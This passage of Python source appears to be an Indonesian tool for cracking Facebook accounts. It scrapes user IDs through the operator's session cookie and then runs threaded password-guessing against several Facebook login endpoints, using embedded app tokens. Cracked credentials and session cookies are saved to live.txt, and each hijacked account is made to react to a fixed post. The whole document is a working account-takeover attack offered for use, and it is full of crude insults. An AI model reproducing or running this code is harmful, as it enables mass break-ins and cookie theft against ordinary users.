				if "Lihat selengkapnya" in kontol:
					self.saran(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		except:pass
	def menu(self):
		about(self.url).tentang()
		pilih=input("[?] Pilih : ")
		if pilih in["1","01"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.folower(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["2","02"]:
			self.babaturan(f"{self.url}/friends/center/friends/")
		elif pilih in["3","03"]:
			while True:
				kontol=input("[?] Masukkan Id Grup : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "Konten Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						else:
							print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
							print("[!] Tekan CTRL + C Untuk Berhenti")
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["4","04"]:
			while True:
				kontol=input("[?] Nama : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f"[!] Pengguna Dengan Nama {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.teangan(f"{self.url}/search/people/?q={kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih in["5","05"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f"[!] Daftar Teman Tidak Di Publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.flrencang(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["6","06"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Permintaan" in ajg:
					print("[!] Permintaan Pertemanan Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["7","07"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/outgoing/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Saran" in ajg:
					print("[!] Tidak Ada Permintaan Terkirim Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					jumlah=int(input("[?] Jumlah : "))
					if "5000" in str(jumlah):
						jumlah-=1
					if jumlah<5001:
						self.saran(f"{self.url}/friends/center/requests/outgoing/#friends_center_main",jumlah)
					else: exit("[!] Max 5000 User")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
			except ValueError:
				exit("[!] Isi Yang Bener Ajg")
		elif pilih in["8","08"]:
			kontol=input("[?] Url/Id Postingan : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f"[!] Posting Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0].replace(";","&")
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except IndexError:
						print("[!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
			except req.exceptions.MissingSchema:
				print(f"[!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
		elif pilih in["9","09"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/suggestions",cookies=kueh).text
				if "Tidak Ada Saran" in ajg:
					print("[!] Tidak Ada Saran Teman");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					jumlah=int(input("[?] Jumlah : "))
					if "5000" in str(jumlah):
						jumlah-=1
					if jumlah<5001:
						self.saran(f"{self.url}/friends/center/suggestions",jumlah)
					else: exit("[!] Max 5000 User")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
			except ValueError:
				exit("[!] Isi Yang Bener Ajg")
		elif pilih=="10":
			while True:
				kontol=input("[?] Hashtag : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg or "Halaman yang Anda minta tidak ditemukan." in ajg:
							print(f"[!] Hashtag {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
							print(f"[!] Postingan Dengan Hashtag {kontol} Disembunyikan Karna Melanggar Standar Komunitas Fb");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.hastag(f"{self.url}/hashtag/{kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih=="11":
			print("\n[L] Lihat Hasil Crack")
			print("[R] Laporkan Masalah")
			print("[U] Update Script")
			print("[H] Hapus Cookie")
			print("[I] Info Script")
			print("[B] Kembali")
			print("[K] Keluar\n")
			self.fuck()
		elif pilih in["0","00"]:
			exit("[*] Thank You For Using My Tool")
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");waktu(0.8);self.menu()
		else:
			print("[!] Pilihan Tidak Ada");self.menu()
		if len(self.id)!=0:
			print("")
			self.askk()
		else:
			print("[!] Gagal Mengambil ID, Silahkan Coba Lagi");waktu(1.5);self.menu()
	def fuck(self):
		pilih=input("[?] Pilih : ")
		if pilih in["l","L"]:
			tod=open("live.txt","r").read()
			tOd=open("chek.txt","r").read()
			if len(tod)==0 or "|" not in tod:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Live")
			else:
				print("\n\x1b[1;32m[Result Live]\n")
				print(tod)
			if len(tOd)==0 or "|" not in tOd:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Chek")
			else:
				print("\n\x1b[1;33m[Result Check]\n")
				print(tOd)
			exit()
		elif pilih in["r","R"]:
			print("[*] Silahkan Hubungi WhatsApp Saya 083805812588");os.system("xdg-open http://wa.me/+6283805812588?text=assalamualaikum");input("[*] Enter Untuk Kembali Ke Menu > ");waktu(2);self.menu()
		elif pilih in["u","U"]:
			os.system("git pull")
			exit()
		elif pilih in["h","H"]:
			try:os.remove("lo_ngentod/cookie");os.remove("lo_ngentod/token");os.remove("lo_ngentod/my_info")
			except:os.system("rm -rf lo_ngentod/cookie && rm -rf lo_ngentod/token && rm -rf lo_ngentod/my_info")
			exit()
		elif pilih in["i","I"]:
			about().tentang_sc()
			self.menu()
		elif pilih in["b","B"]:
			self.menu()
		elif pilih in["k","K"]:
			exit("[*] Thank You For Using My Tool")
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");self.fuck()
		else:
			print("[!] Pilihan Tidak Ada");self.fuck()
	def askk(self):
		njir=input("[?] Ingin Menggunakan Password Manual Y/T : ")
		if njir in(""," "):
			print("[!] Jangan Kosong Bro");self.askk()
		elif njir in("y","Y"):
			print("[*] Contoh : name123,name12345")
			while True:
				pwek=input("[?] Password : ")
				if pwek in(""," "):
					print("[!] Jangan Kosong Bro")
				elif len(pwek)<=5:
					print("[!] Password Minimal 6 Karakter")
				else:
					def xhh(xss=None):
						pilih=input("[?] Pilih : ")
						if pilih in(""," "):
							print("[!] Jangan Kosong Bro");xhh()
						elif pilih in("1","01"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.crackapi,xi,xss)
									except: pass
							hasil(live,chek)
						elif pilih in("2","02"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://mbasic.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("3","03"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://free.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("4","04"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.graph,xi,xss)
									except: pass
							hasil(live,chek)
						else:
							print("[!] Isi Yang Bener Ajg");xhh()
					print("    [ Pilih Metode Crack ]")
					print("[1] Metode b-api (Mode Crack Cepat)")
					print("[2] Metode mbasic (Mode Crack Lambat)")
					print("[3] Metode free.facebook (Mode Crack Lambat)")
					#print("[4] Metode graph.facebook (Mode Crack Cepat)")
					xhh(pwek.split(","))
					break
		elif njir in("t","T"):
			print("    [ Pilih Metode Crack ]")
			print("[1] Metode b-api (Mode Crack Cepat)")
			print("[2] Metode mbasic (Mode Crack Lambat)")
			print("[3] Metode free.facebook (Mode Crack Lambat)")
			#print("[4] Metode graph.facebook (Mode Crack Cepat)")
			self.ngontol()
		else:
			print("[!] Isi Yang Bener Ajg");self.askk()
	def crackapi(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("live.txt","r").read() or user in open("chek.txt","r").read():
				break
			else:
				ses=req.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param)
				if "session_key" in send.text and "EAAA" in send.text:
					ok+=1
					print(f"\r\x1b[1;32m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("live.txt","a").write(f"{user}|{pw}\n")
					live.append(f"{user}{pw}")
					break
				elif "www.facebook.com" in send.json()["error_msg"]:
					cp+=1
					print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("chek.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def modol(self,user,ox,beol,**kwargs):
		global ok,cp,cot
		for pw in ox:
			if user in open("live.txt","r").read() or user in open("chek.txt","r").read(): break
			else:
				ses=req.Session()
				a=ses.get(f"{beol}/login/?next&ref=dbl&refid=8").text
				b=parser(a,"html.parser")
				for x in b.find_all("input"):
					if x.get("name")==None or "_fb_noscript" in x.get("name") or "sign_up" in x.get("name"):continue
					else:kwargs.update({x.get("name"):x.get("value")})
				kwargs.update({"email":user,"pass":pw})
				tol=beol+b.find("form",method="post").get("action")
				if "m.facebook.com" in beol:ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"x-fb-lsd":kwargs.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua_,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","origin":beol,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
				else:
					if "mbasic.facebook.com" in beol:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
					else:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
					ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":anjg,"origin":beol,"user-agent":ua_,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				ses.post(tol,data=kwargs,allow_redirects=False)
				kuke=ses.cookies.get_dict()
				if "c_user" in kuke:
					ok+=1
					kuki=f"c_user={kuke.get('c_user')};fr={kuke.get('fr')};xs={kuke.get('xs')}"
					print(f"\r\x1b[1;32m * ---> {kuke.get('c_user')}|{pw}|{kuki}\x1b[0m\n",end="")
					open("live.txt","a").write(f"{kuke.get('c_user')}|{pw}|{kuki}\n")
					live.append(f"{kuke.get('c_user')}{pw}{kuki}")
					react_me(kuke,beol)
					break
				elif "checkpoint" in kuke:
					cp+=1
					try:uid=re.search("3A(\\d*)",kuke.get("checkpoint")).group(1)
					except:uid=user
					print(f"\r\x1b[1;33m * ---> {uid}|{pw}\x1b[0m\n",end="")
					open("chek.txt","a").write(f"{user}|{uid}|{pw}\n")
					chek.append(f"{user}|{uid}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def graph(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("live.txt","r").read() or user in open("chek.txt","r").read(): break
			else:
				ses=req.Session()
				respon=ses.post("https://graph.facebook.com/auth/login",data={"locale":"id_ID","format":"json","email":user,"password":pw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1"}).text
				if "access_token" in respon:
					ok+=1
					#print(respon)
					print(f"\r\x1b[1;32m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("live.txt","a").write(f"{user}|{pw}\n")
					live.append(f"{user}{pw}")
					#react_me(kuke,beol)
					break
				elif "User must verify their account" in respon or "Untuk Sementara Akun Tidak Tersedia" in respon:
					cp+=1
					print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("chek.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def ngontol(self):
		from password import list_pass
		nanya=input("[?] Pilih : ")
		if nanya in[""," "]:
			print("[!] Jangan Kosong Bro");self.ngontol()
		elif nanya in["1","01"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						pewe=list_pass.pw_list(xi)
						tokai.submit(self.crackapi,xi[0],pewe)
					except:pass
			hasil(live,chek)
		elif nanya in["2","02"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						pewe=list_pass.pw_list(xi)
						tokai.submit(self.modol,xi[0],pewe,"https://mbasic.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in["3","03"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						pewe=list_pass.pw_list(xi)
						tokai.submit(self.modol,xi[0],pewe,"https://free.facebook.com")
					except:pass
			hasil(live,chek)
		else:
			print("[!] Isi Yang Bener Ajg");self.ngontol()
def zxss(kuk):
	dict={}
	if "; " in kuk:
		kek=kuk.split("; ")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
			return dict
	else:
		kek=kuk.split(";")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
			return dict
class asup:
	def __init__(self,cok):
		self.cok,self.url=cok,"https://mbasic.facebook.com"
	def login(self):
		try:
			cek=req.get(f"{self.url}/profile.php?v=info",cookies=zxss(self.cok)).text
			if "mbasic_logout_button" in cek:
				print("\n\n[*] Hai, Welcome "+re.findall("\<title\>(.*?)<\/title\>",cek)[0]+" Ngentod:v")
				waktu(1)
				print("[!] Mohon Tunggu Sebentar Ngentod:v")
				open("lo_ngentod/cookie","w").write(self.cok)
				from kentod import aap_afandi,informasi
				if "Laporkan Masalah" in cek:
					mengontol=aap_afandi.ganteng(zxss(self.cok),self.url)
					informasi.info(zxss(self.cok),cek).myinfo()
					mengontol.reaksi()
					exit("[✓] Login Berhasil, Jalankan Ulang Tools Nya")
				else:
					mengontol=aap_afandi.ganteng(zxss(self.cok),self.url)
					mengontol.lang(zxss(self.cok))
					informasi.info(zxss(self.cok),cek).myinfo()
					mengontol.reaksi()
					exit("[✓] Login Berhasil, Jalankan Ulang Tools Nya")
			else:
				exit("\n\n[!] Cookie Invalid")
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			exit("[!] Kesalahan Pada Koneksi")
def react_me(coki,url):
	try:
		a=parser(req.get(url+"/reactions/picker/?is_permalink=1&ft_id=1685961541608783",cookies=coki).text,"html.parser")
		if "Hapus" not in str(a):
			for x in a.find_all("a"):
				if "reaction_type=8" in x.get("href"):
					req.get(url+x.get("href"),cookies=coki)
	except: pass
if __name__=="__main__":
	if os.path.exists("lo_ngentod"): pass
	else: os.mkdir("lo_ngentod")
	try:
		kueh=zxss(open("lo_ngentod/cookie","r").read().strip())
	except FileNotFoundError:
		os.system("clear")
		print("\n[*] Cara Mendapatkan Cookie : https://youtu.be/ZT4MU7AlgA4\n[*] Ketik OPEN Untuk Membuka Video\n")
		while True:
			a=input("[?] Masukkan Cookie : ")
			if a in[""," "]:
				print("[!] Jangan Kosong")
			elif a in["open","OPEN","Open"]:
				import subprocess
				exit(subprocess.Popen(["am","start","https://youtu.be/ZT4MU7AlgA4"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
			else:
				asup(a).login()
	try:
		tentang=json.loads(open("lo_ngentod/my_info","r").read().strip())
	except FileNotFoundError:
		from kentod import informasi
		informasi.info(kueh,req.get("https://mbasic.facebook.com/profile.php?v=info",cookies=kueh).text).myinfo();restart()
	if os.path.exists("chek.txt"): pass
	else: open("chek.txt","a").close()
	if os.path.exists("live.txt"): pass
	else: open("live.txt","a").close()
	ngentod().menu()


"""
Create By Aap Afandi Ganteng
GITHUB : https://github.com/KangPacman
"""